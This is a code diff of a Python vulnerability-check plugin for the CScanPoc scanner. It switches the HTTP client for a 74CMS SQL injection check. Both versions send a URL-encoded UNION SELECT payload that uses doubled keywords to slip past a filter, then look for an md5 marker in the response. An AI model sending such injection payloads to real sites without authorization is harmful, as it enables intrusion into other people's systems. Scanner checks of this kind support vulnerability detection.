@@ -2,7 +2,6 @@
 
 from CScanPoc.thirdparty import requests,hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
     vuln_id = '74CMS_0007' # 平台漏洞编号，留空
@@ -34,11 +33,9 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg
-            code,res, _ = hh.http(url + "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"
-                   "%201,2,3,md5(7836457),5,6,7,8,9%23")
-                       
-            if code == 200:
-                if "3438d5e3ead84b2effc5ec33ed1239f5" in res:
+            req = requests.get(url + "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect"+"%201,2,3,md5(7836457),5,6,7,8,9%23")
+            if req.status_code == 200:
+                if "3438d5e3ead84b2effc5ec33ed1239f5" in req.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
